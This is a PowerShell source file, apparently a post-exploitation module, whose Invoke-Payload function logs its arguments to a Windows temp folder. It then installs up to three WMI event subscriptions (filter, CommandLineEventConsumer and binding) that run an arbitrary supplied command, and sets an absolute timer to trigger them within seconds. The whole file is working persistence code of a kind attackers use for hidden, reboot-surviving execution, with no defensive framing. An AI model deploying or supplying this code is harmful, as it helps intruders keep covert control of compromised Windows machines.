function Invoke-Payload {
    param($Arg1, $Arg2, $Arg3, $Arg4, $Arg5, $Arg6, $Arg7, $Arg8, $Arg9, $Arg10, $Arg11, $Arg12)

    $logPath = 'C:\Windows\Temp\smbremoting_args.txt'

    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $content = @(
        "[$timestamp]"
        "Arg1: $Arg1"
        "Arg2: $Arg2"
        "Arg3: $Arg3"
        "Arg4: $Arg4"
        "Arg5: $Arg5"
        "Arg6: $Arg6"
        "Arg7: $Arg7"
        "Arg8: $Arg8"
        "Arg9: $Arg9"
        "Arg10: $Arg10"
        "Arg11: $Arg11"
        "Arg12: $Arg12"
        "----"
    )

    $content | Out-File -FilePath $logPath -Append -Encoding UTF8

    function Install-Persistence{
        param(
            [string]$EventFilterName,   
            [string]$EventConsumerName, 
            [string]$finalPayload,      
            [string]$Query             
        )
        $EventFilterArgs = @{
            EventNamespace = 'root/cimv2'
            Name = $EventFilterName
            Query = $Query
            QueryLanguage = 'WQL'
        }
        $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
        $CommandLineConsumerArgs = @{
            Name = $EventConsumerName
            CommandLineTemplate = $finalPayload
        }
        $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
        $FilterToConsumerArgs = @{
            Filter = $Filter
            Consumer = $Consumer
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
        $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
        $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
        $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"
    };
	
    if (Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$Arg2'") {exit 0;}

    Install-Persistence -EventFilterName $Arg1 -EventConsumerName $Arg2 -Query $Arg3 -finalPayload $Arg4
    Install-Persistence -EventFilterName $Arg5 -EventConsumerName $Arg6 -Query $Arg7 -finalPayload $Arg8
    Install-Persistence -EventFilterName $Arg9 -EventConsumerName $Arg10 -Query $Arg11 -finalPayload $Arg12


	$timerId = "OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d"
	$dmtfTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).ToUniversalTime().AddSeconds(10))
	$timerClass = [wmiclass]"\\.\root\cimv2:__AbsoluteTimerInstruction"
	$timer = $timerClass.CreateInstance()
	$timer.TimerId = $timerId
	$timer.EventDateTime = $dmtfTime
	$timer.Put() | Out-Null
}
